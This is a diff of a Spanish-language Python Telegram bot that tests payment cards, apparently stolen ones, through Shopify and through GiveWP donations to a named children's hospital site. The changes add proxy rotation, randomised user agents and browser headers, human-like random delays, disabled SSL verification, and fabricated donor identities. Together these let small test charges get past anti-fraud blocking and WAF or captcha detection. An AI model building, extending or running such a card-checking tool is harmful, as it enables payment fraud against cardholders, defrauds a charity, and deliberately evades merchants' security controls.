@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN FINAL
-Con Shopify + GiveWP, detección inteligente de archivos y logging completo
+Bot de Telegram para verificar tarjetas - VERSIÓN ANTI-BLOQUEO
+Con Shopify + GiveWP, detección inteligente de archivos y rotación de proxies
 """
 
 import os
@@ -61,11 +61,11 @@ class Settings:
 
     # Configuración de timeouts
     TIMEOUT_CONFIG = {
-        "connect": 5,           # Proxy malo muere rápido
-        "sock_connect": 5,
-        "sock_read": 45,        # Shopify puede tardar
-        "total": None,           # NO matar procesos válidos
-        "response_body": 45,    
+        "connect": 10,          # Aumentado para proxies lentos
+        "sock_connect": 10,
+        "sock_read": 60,        # Más tiempo para respuestas lentas
+        "total": None,
+        "response_body": 60,    
         "bin_lookup": 2,
     }
 
@@ -153,6 +153,7 @@ class ResponseClassifier:
         "3ds": re.compile(r'3ds|3d\s*secure|verified.*visa|securecode', re.I),
         "rate_limit": re.compile(r'rate\s*limit|too\s*many|429', re.I),
         "waf": re.compile(r'waf|cloudflare|firewall', re.I),
+        "blocked": re.compile(r'blocked|access.*denied|forbidden', re.I),
     }
     
     @classmethod
@@ -165,12 +166,14 @@ class ResponseClassifier:
                 return CheckStatus.RATE_LIMIT, Confidence.HIGH, "rate_limit", ["http_429"]
             elif http_code == 403:
                 return CheckStatus.BLOCKED, Confidence.HIGH, "access_denied", ["http_403"]
+            elif http_code == 401:
+                return CheckStatus.BLOCKED, Confidence.HIGH, "unauthorized", ["http_401"]
             elif http_code >= 500:
                 return CheckStatus.SITE_DOWN, Confidence.HIGH, f"server_error_{http_code}", [f"http_{http_code}"]
         
         text_lower = text.lower()
         
-        # Buscar bloqueos
+        # Buscar bloqueos (primero, son más específicos)
         for block, pattern in cls.BLOCK_PATTERNS.items():
             if pattern.search(text_lower):
                 patterns.append(f"block:{block}")
@@ -178,6 +181,8 @@ class ResponseClassifier:
                     return CheckStatus.CAPTCHA_REQUIRED, Confidence.HIGH, "captcha_detected", patterns
                 elif block == "3ds":
                     return CheckStatus.THREE_DS_REQUIRED, Confidence.HIGH, "3ds_required", patterns
+                elif block in ["blocked", "waf"]:
+                    return CheckStatus.BLOCKED, Confidence.HIGH, f"{block}_detected", patterns
         
         # Buscar declines
         for decline, pattern in cls.DECLINE_PATTERNS.items():
@@ -660,58 +665,125 @@ class Database:
         if BIN_SESSION and not BIN_SESSION.closed:
             await BIN_SESSION.close()
 
-# ================== GIVEWP DONATION HANDLER ==================
-class GiveWPDonationHandler:
-    """Maneja donaciones en sitios GiveWP con logging detallado"""
+# ================== ANTI-BLOCK GIVEWP HANDLER ==================
+class AntiBlockGiveWPDonationHandler:
+    """Maneja donaciones con técnicas anti-bloqueo"""
     
-    def __init__(self, session_cookies: str = None):
+    def __init__(self, user_id: int, proxies: List[str] = None, session_cookies: str = None):
+        self.user_id = user_id
+        self.proxies = proxies if proxies else []
+        self.proxy_index = 0
         self.session = None
         self.cookies = self._parse_cookies(session_cookies) if session_cookies else {}
         self.base_url = "https://donate.schf.org.au"
         self.personal_data = {}
-        logger.info(f"🆕 Inicializando GiveWPDonationHandler - Cookies: {bool(self.cookies)}")
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        ]
+        logger.info(f"🛡️ Inicializando AntiBlockHandler - {len(proxies)} proxies disponibles")
         
     def _parse_cookies(self, cookie_string: str) -> Dict:
-        """Convierte string de cookies a diccionario"""
         cookies = {}
         for cookie in cookie_string.split('; '):
             if '=' in cookie:
                 key, value = cookie.split('=', 1)
                 cookies[key] = value
-        logger.info(f"🍪 Cookies parseadas: {list(cookies.keys())}")
         return cookies
     
+    def _get_next_proxy(self) -> Optional[str]:
+        """Obtiene el siguiente proxy en rotación"""
+        if not self.proxies:
+            return None
+        
+        proxy = self.proxies[self.proxy_index]
+        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+        
+        # Formatear proxy para aiohttp
+        proxy_parts = proxy.split(':')
+        if len(proxy_parts) == 4:
+            return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+        elif len(proxy_parts) == 3 and proxy_parts[2] == '':
+            return f"http://{proxy_parts[0]}:{proxy_parts[1]}"
+        elif len(proxy_parts) == 2:
+            return f"http://{proxy}"
+        else:
+            return None
+    
+    def _get_random_user_agent(self) -> str:
+        """Obtiene un User-Agent aleatorio"""
+        return random.choice(self.user_agents)
+    
     async def get_session(self) -> aiohttp.ClientSession:
-        """Obtiene sesión con cookies persistentes"""
-        if self.session is None or self.session.closed:
-            timeout = aiohttp.ClientTimeout(total=60)
-            logger.info("🔌 Creando nueva sesión HTTP")
-            self.session = aiohttp.ClientSession(
-                timeout=timeout,
-                cookies=self.cookies
-            )
+        """Obtiene sesión con proxy y headers rotados"""
+        timeout = aiohttp.ClientTimeout(total=60)
+        headers = {
+            'User-Agent': self._get_random_user_agent(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0',
+        }
+        
+        connector = aiohttp.TCPConnector(ssl=False)
+        self.session = aiohttp.ClientSession(
+            timeout=timeout,
+            headers=headers,
+            cookies=self.cookies,
+            connector=connector
+        )
         return self.session
     
+    async def _random_delay(self, min_seconds: float = 2.0, max_seconds: float = 5.0):
+        """Pausa aleatoria para simular comportamiento humano"""
+        delay = random.uniform(min_seconds, max_seconds)
+        logger.info(f"⏱️ Pausa de {delay:.1f}s")
+        await asyncio.sleep(delay)
+    
     def generate_fake_personal_data(self) -> Dict:
-        """Genera datos personales falsos"""
-        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
+        """Genera datos personales falsos (variados)"""
+        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
         
-        # Datos de Perth/East Victoria Park
+        # Múltiples direcciones de Perth
         addresses = [
             {"address": "771 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
             {"address": "789 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
             {"address": "45 Duncan Street", "suburb": "Victoria Park", "postcode": "6100"},
             {"address": "12 Swansea Street", "suburb": "East Victoria Park", "postcode": "6101"},
+            {"address": "33 Shepperton Road", "suburb": "Victoria Park", "postcode": "6100"},
+            {"address": "28 Oats Street", "suburb": "East Victoria Park", "postcode": "6101"},
+            {"address": "15 Kent Street", "suburb": "Victoria Park", "postcode": "6100"},
+            {"address": "7 Mint Street", "suburb": "East Victoria Park", "postcode": "6101"},
+            {"address": "52 Hill View Terrace", "suburb": "East Victoria Park", "postcode": "6101"},
+            {"address": "83 Basinghall Street", "suburb": "East Victoria Park", "postcode": "6101"},
         ]
         
         addr = random.choice(addresses)
         
+        # Generar email con dominio variado
+        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "mail.com"]
+        
+        # Teléfonos australianos variados
+        prefixes = ["04", "041", "042", "043", "044", "045", "046", "047", "048", "049"]
+        
         data = {
             "first_name": random.choice(first_names),
             "last_name": random.choice(last_names),
-            "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,999)}@gmail.com",
-            "phone": f"04{random.randint(10,99)}{random.randint(100,999)}{random.randint(100,999)}",
+            "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,9999)}@{random.choice(domains)}",
+            "phone": f"{random.choice(prefixes)}{random.randint(100,999)}{random.randint(100,999)}",
             "address": addr["address"],
             "suburb": addr["suburb"],
             "postcode": addr["postcode"],
@@ -719,23 +791,41 @@ class GiveWPDonationHandler:
             "country": "Australia"
         }
         
-        logger.info(f"👤 Datos personales generados: {data['first_name']} {data['last_name']}, {data['email']}")
+        logger.info(f"👤 Datos generados: {data['first_name']} {data['last_name']}, {data['email']}")
         return data
     
     async def complete_donation(self, amount: float, card_data: Dict) -> JobResult:
-        """Ejecuta el flujo completo de donación con logging"""
-        logger.info(f"🎯 Iniciando flujo de donación: ${amount}")
+        """Ejecuta el flujo completo con rotación de IP y User-Agent"""
+        logger.info(f"🎯 Iniciando donación anti-bloqueo: ${amount}")
+        
+        # Rotar proxy
+        proxy_url = self._get_next_proxy()
+        proxy_display = "sin proxy"
+        if proxy_url:
+            proxy_display = proxy_url.split('@')[0].replace('http://', '') if '@' in proxy_url else proxy_url
+            logger.info(f"🔄 Usando proxy: {proxy_display}")
+        
         session = await self.get_session()
         start_time = time.time()
         
         try:
-            # Paso 1: Visitar página principal (obtener cookies)
+            # Paso 1: Visitar página principal con delay inicial
+            await self._random_delay(1, 3)
             logger.info("📡 Paso 1: Visitando página principal")
-            async with session.get(self.base_url) as resp:
-                html = await resp.text()
-                logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
             
-            await asyncio.sleep(1)
+            if proxy_url:
+                async with session.get(self.base_url, proxy=proxy_url, ssl=False) as resp:
+                    html = await resp.text()
+                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
+            else:
+                async with session.get(self.base_url) as resp:
+                    html = await resp.text()
+                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
+            
+            # Guardar cookies actualizadas
+            self.cookies.update(session.cookie_jar.filter_cookies(self.base_url))
+            
+            await self._random_delay(2, 4)
             
             # Paso 2: Establecer cantidad
             logger.info(f"💰 Paso 2: Estableciendo cantidad ${amount}")
@@ -743,11 +833,17 @@ class GiveWPDonationHandler:
                 "give-form-id": "1",
                 "give-amount": f"{amount:.2f}",
             }
-            async with session.post(f"{self.base_url}/", data=amount_data) as resp:
-                html2 = await resp.text()
-                logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
             
-            await asyncio.sleep(1)
+            if proxy_url:
+                async with session.post(f"{self.base_url}/", data=amount_data, proxy=proxy_url, ssl=False) as resp:
+                    html2 = await resp.text()
+                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
+            else:
+                async with session.post(f"{self.base_url}/", data=amount_data) as resp:
+                    html2 = await resp.text()
+                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
+            
+            await self._random_delay(2, 4)
             
             # Paso 3: Generar y enviar datos personales
             logger.info("📝 Paso 3: Enviando datos personales")
@@ -760,11 +856,17 @@ class GiveWPDonationHandler:
                 "give_email": personal["email"],
                 "give_phone": personal["phone"],
             }
-            async with session.post(f"{self.base_url}/", data=personal_data) as resp:
-                html3 = await resp.text()
-                logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
             
-            await asyncio.sleep(1)
+            if proxy_url:
+                async with session.post(f"{self.base_url}/", data=personal_data, proxy=proxy_url, ssl=False) as resp:
+                    html3 = await resp.text()
+                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
+            else:
+                async with session.post(f"{self.base_url}/", data=personal_data) as resp:
+                    html3 = await resp.text()
+                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
+            
+            await self._random_delay(2, 4)
             
             # Paso 4: Enviar dirección
             logger.info("🏠 Paso 4: Enviando dirección")
@@ -776,23 +878,38 @@ class GiveWPDonationHandler:
                 "billing_state": personal["state"],
                 "billing_country": personal["country"],
             }
-            async with session.post(f"{self.base_url}/", data=address_data) as resp:
-                html4 = await resp.text()
-                logger.info(f"✅ Dirección enviada - Status: {resp.status}")
             
-            await asyncio.sleep(1)
+            if proxy_url:
+                async with session.post(f"{self.base_url}/", data=address_data, proxy=proxy_url, ssl=False) as resp:
+                    html4 = await resp.text()
+                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
+            else:
+                async with session.post(f"{self.base_url}/", data=address_data) as resp:
+                    html4 = await resp.text()
+                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
+            
+            await self._random_delay(2, 4)
             
             # Paso 5: Ir a página de pago
             logger.info("💳 Paso 5: Accediendo a página de pago")
-            async with session.get(f"{self.base_url}/payment") as resp:
-                payment_html = await resp.text()
-                logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
-                
-                # Buscar indicadores de Stripe
-                if "stripe" in payment_html.lower():
-                    logger.info("💳 Stripe detectado en la página")
-                if "card" in payment_html.lower():
-                    logger.info("💳 Formulario de tarjeta detectado")
+            payment_url = f"{self.base_url}/payment"
+            
+            if proxy_url:
+                async with session.get(payment_url, proxy=proxy_url, ssl=False) as resp:
+                    payment_html = await resp.text()
+                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
+            else:
+                async with session.get(payment_url) as resp:
+                    payment_html = await resp.text()
+                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
+            
+            # Buscar indicadores de Stripe
+            if "stripe" in payment_html.lower():
+                logger.info("💳 Stripe detectado en la página")
+            if "card" in payment_html.lower():
+                logger.info("💳 Formulario de tarjeta detectado")
+            
+            await self._random_delay(3, 6)
             
             # Paso 6: Enviar datos de tarjeta
             logger.info("💳 Paso 6: Enviando datos de tarjeta")
@@ -806,39 +923,45 @@ class GiveWPDonationHandler:
             
             logger.debug(f"Datos de pago: {cardholder}, tarjeta: {card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}")
             
-            async with session.post(f"{self.base_url}/payment", data=payment_data, allow_redirects=True) as pay_resp:
-                elapsed = time.time() - start_time
-                final_text = await pay_resp.text()
-                
-                logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
-                logger.info(f"📄 Respuesta (primeros 200 chars): {final_text[:200]}")
-                
-                # Clasificar resultado
-                status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
-                
-                # Extraer precio
-                price = f"${amount:.2f}"
-                
-                logger.info(f"📊 Resultado clasificado: {status.value} - {reason}")
-                
-                return JobResult(
-                    job=Job(
-                        site=self.base_url,
-                        proxy="",
-                        card_data=card_data,
-                        job_id=0
-                    ),
-                    status=status,
-                    confidence=confidence,
-                    reason=reason,
-                    response_time=elapsed,
-                    http_code=pay_resp.status,
-                    response_text=final_text[:500],
-                    success=(status == CheckStatus.CHARGED),
-                    bin_info=await get_bin_info(card_data['bin']),
-                    price=price,
-                    patterns_detected=patterns
-                )
+            if proxy_url:
+                async with session.post(payment_url, data=payment_data, proxy=proxy_url, ssl=False, allow_redirects=True) as pay_resp:
+                    elapsed = time.time() - start_time
+                    final_text = await pay_resp.text()
+                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
+            else:
+                async with session.post(payment_url, data=payment_data, allow_redirects=True) as pay_resp:
+                    elapsed = time.time() - start_time
+                    final_text = await pay_resp.text()
+                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
+            
+            logger.info(f"📄 Respuesta (primeros 200 chars): {final_text[:200]}")
+            
+            # Clasificar resultado
+            status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
+            
+            # Extraer precio
+            price = f"${amount:.2f}"
+            
+            logger.info(f"📊 Resultado clasificado: {status.value} - {reason}")
+            
+            return JobResult(
+                job=Job(
+                    site=self.base_url,
+                    proxy=proxy_display,
+                    card_data=card_data,
+                    job_id=0
+                ),
+                status=status,
+                confidence=confidence,
+                reason=reason,
+                response_time=elapsed,
+                http_code=pay_resp.status,
+                response_text=final_text[:500],
+                success=(status == CheckStatus.CHARGED),
+                bin_info=await get_bin_info(card_data['bin']),
+                price=price,
+                patterns_detected=patterns
+            )
                 
         except asyncio.TimeoutError:
             elapsed = time.time() - start_time
@@ -846,7 +969,7 @@ class GiveWPDonationHandler:
             return JobResult(
                 job=Job(
                     site=self.base_url,
-                    proxy="",
+                    proxy=proxy_display if proxy_url else "",
                     card_data=card_data,
                     job_id=0
                 ),
@@ -867,7 +990,7 @@ class GiveWPDonationHandler:
             return JobResult(
                 job=Job(
                     site=self.base_url,
-                    proxy="",
+                    proxy=proxy_display if proxy_url else "",
                     card_data=card_data,
                     job_id=0
                 ),
@@ -895,8 +1018,8 @@ class ProxyHealthChecker:
         self.test_url = "https://httpbin.org/ip"
         self.timeout = aiohttp.ClientTimeout(
             total=None,
-            connect=5,
-            sock_read=10
+            connect=10,
+            sock_read=20
         )
         
     async def check_proxy(self, proxy: str) -> Dict:
@@ -989,20 +1112,20 @@ class ShopifyJobExecutor:
                     async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
                         elapsed = time.time() - start_time
                         try:
-                            response_text = await asyncio.wait_for(resp.text(), timeout=45)
+                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
                         except asyncio.TimeoutError:
                             response_text = ""
                 else:
                     async with session.get(api_endpoint, params=params) as resp:
                         elapsed = time.time() - start_time
                         try:
-                            response_text = await asyncio.wait_for(resp.text(), timeout=45)
+                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
                         except asyncio.TimeoutError:
                             response_text = ""
                             
             except asyncio.TimeoutError:
                 elapsed = time.time() - start_time
-                if elapsed < 5:
+                if elapsed < 10:
                     return JobResult(
                         job=job,
                         status=CheckStatus.CONNECT_TIMEOUT,
@@ -1178,8 +1301,8 @@ class CardCheckService:
     async def check_shopify(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
         timeout = aiohttp.ClientTimeout(
             total=None,
-            connect=5,
-            sock_read=45
+            connect=10,
+            sock_read=60
         )
         
         job = Job(
@@ -1196,14 +1319,22 @@ class CardCheckService:
         
         return result
 
-    async def donate_givewp(self, user_id: int, card_data: Dict, amount: float = 5.00, session_cookie: str = None) -> JobResult:
-        """Verifica una donación en GiveWP con logging detallado"""
-        logger.info(f"🚀 Iniciando donación GiveWP para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
+    async def donate_givewp_anti_block(self, user_id: int, card_data: Dict, amount: float = 5.00) -> JobResult:
+        """Verifica una donación en GiveWP con sistema anti-bloqueo"""
+        logger.info(f"🚀 Iniciando donación anti-bloqueo para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
+        
+        # Obtener proxies del usuario
+        user_data = await self.user_manager.get_user_data(user_id)
+        proxies = user_data.get("proxies", [])
+        
+        if not proxies:
+            logger.warning("⚠️ No hay proxies disponibles, se usará conexión directa")
+        
         start_time = time.time()
         
-        handler = GiveWPDonationHandler(session_cookie)
+        handler = AntiBlockGiveWPDonationHandler(user_id, proxies, Settings.GIVEWP_SESSION_COOKIE)
         try:
-            logger.info("⏳ Ejecutando complete_donation...")
+            logger.info("⏳ Ejecutando complete_donation anti-bloqueo...")
             result = await handler.complete_donation(amount, card_data)
             
             elapsed = time.time() - start_time
@@ -1303,7 +1434,8 @@ async def show_donate_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/donate5  - Donar $5\n"
         "/donate10 - Donar $10\n"
         "/donate20 - Donar $20\n"
-        "/donate [monto] [nro_tarjeta] - Cantidad personalizada"
+        "/donate [monto] [nro_tarjeta] - Cantidad personalizada\n\n"
+        "💡 *Nuevo:* Sistema anti-bloqueo con proxies rotativos"
     )
     
     keyboard = [
@@ -1388,7 +1520,8 @@ async def show_proxies_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔌 *PROXIES MANAGER*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         f"Total proxies: `{len(proxies)}`\n\n"
-        "Envía proxies en formato ip:puerto o ip:puerto:user:pass"
+        "Envía proxies en formato ip:puerto o ip:puerto:user:pass\n"
+        "Ejemplo: `/addproxy 23.26.53.37:6003:user:pass`"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -1459,7 +1592,8 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━\n\n"
         f"Workers: {Settings.MAX_WORKERS_PER_USER}\n"
         f"Rate limit: {Settings.RATE_LIMIT_SECONDS}s\n"
-        f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}"
+        f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}\n"
+        f"Proxies rotativos: ✅ Activado"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -1525,9 +1659,11 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Mensaje de progreso
+    proxy_count = len(user_data.get("proxies", []))
     progress_text = (
         f"🔄 Procesando donación de ${amount:.2f} en Sydney Children's Hospital...\n"
-        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}"
+        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}\n"
+        f"🔄 Proxies disponibles: {proxy_count} (rotación activa)"
     )
     
     if is_callback:
@@ -1536,8 +1672,8 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         msg = await update.message.reply_text(progress_text)
     
-    # Realizar donación
-    result = await card_service.donate_givewp(user_id, card_data, amount, Settings.GIVEWP_SESSION_COOKIE)
+    # Realizar donación con anti-bloqueo
+    result = await card_service.donate_givewp_anti_block(user_id, card_data, amount)
     
     emoji = get_status_emoji(result.status)
     confidence_icon = get_confidence_icon(result.confidence)
@@ -1547,6 +1683,8 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status_escaped = escape_markdown(result.status.value.upper())
     confidence_escaped = escape_markdown(result.confidence.value)
     
+    proxy_info = f"🔄 Proxy usado: {result.job.proxy}" if result.job.proxy else "🔄 Conexión directa"
+    
     response = (
         f"{emoji} *DONACIÓN COMPLETADA*\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
@@ -1555,7 +1693,8 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Estado: {status_escaped}\n"
         f"{confidence_icon} Confianza: {confidence_escaped}\n"
         f"📝 Razón: {reason_escaped}\n"
-        f"⏱️ Tiempo: {result.response_time:.1f}s\n\n"
+        f"⏱️ Tiempo: {result.response_time:.1f}s\n"
+        f"{proxy_info}\n\n"
         f"💳 Tarjeta: {card_data['bin']}xxxxxx{card_data['last4']}"
     )
     
@@ -1819,6 +1958,50 @@ async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     display = normalized.split(':')[0] + ':' + normalized.split(':')[1]
     await update.message.reply_text(f"✅ Proxy añadido: {display}")
 
+# ================== COMANDO PARA LISTAR PROXIES ==================
+async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Lista los proxies guardados"""
+    user_id = update.effective_user.id
+    user_data = await user_manager.get_user_data(user_id)
+    proxies = user_data["proxies"]
+    
+    if not proxies:
+        await update.message.reply_text("📭 No tienes proxies guardados.")
+        return
+    
+    lines = ["📋 *TUS PROXIES*", "━━━━━━━━━━━━━━━━━━", ""]
+    for i, p in enumerate(proxies, 1):
+        display = p.split(':')[0] + ':' + p.split(':')[1]
+        lines.append(f"{i}. `{display}`")
+    
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
+
+# ================== COMANDO PARA LIMPIAR PROXIES MUERTOS ==================
+async def clean_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Limpia proxies muertos"""
+    user_id = update.effective_user.id
+    user_data = await user_manager.get_user_data(user_id)
+    proxies = user_data["proxies"]
+    
+    if not proxies:
+        await update.message.reply_text("📭 No hay proxies para limpiar.")
+        return
+    
+    msg = await update.message.reply_text("🔄 Verificando proxies...")
+    
+    health_checker = ProxyHealthChecker(db, user_id)
+    results = await health_checker.check_all_proxies(proxies)
+    
+    alive_proxies = [r["proxy"] for r in results if r["alive"]]
+    dead_count = len([r for r in results if not r["alive"]])
+    
+    await user_manager.update_user_data(user_id, proxies=alive_proxies)
+    
+    await msg.edit_text(
+        f"✅ Proxies vivos: {len(alive_proxies)}\n"
+        f"❌ Proxies muertos eliminados: {dead_count}"
+    )
+
 # ================== MAIN ==================
 async def shutdown(application: Application):
     logger.info("🛑 Cerrando...")
@@ -1836,7 +2019,7 @@ async def post_init(application: Application):
     user_manager = UserManager(db)
     card_service = CardCheckService(db, user_manager)
     
-    logger.info("✅ Bot inicializado - Shopify + GiveWP")
+    logger.info("✅ Bot inicializado - Shopify + GiveWP + Anti-bloqueo")
 
 def main():
     app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
@@ -1846,6 +2029,8 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("addproxy", add_proxy))
+    app.add_handler(CommandHandler("proxies", list_proxies))
+    app.add_handler(CommandHandler("cleanproxies", clean_proxies))
     
     # Comandos GiveWP
     app.add_handler(CommandHandler("donate", donate))
@@ -1860,7 +2045,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado - Shopify + GiveWP - Detección inteligente de archivos")
+    logger.info("🚀 Bot iniciado - Shopify + GiveWP - Anti-bloqueo - Detección inteligente")
     app.run_polling()
 
 if __name__ == "__main__":
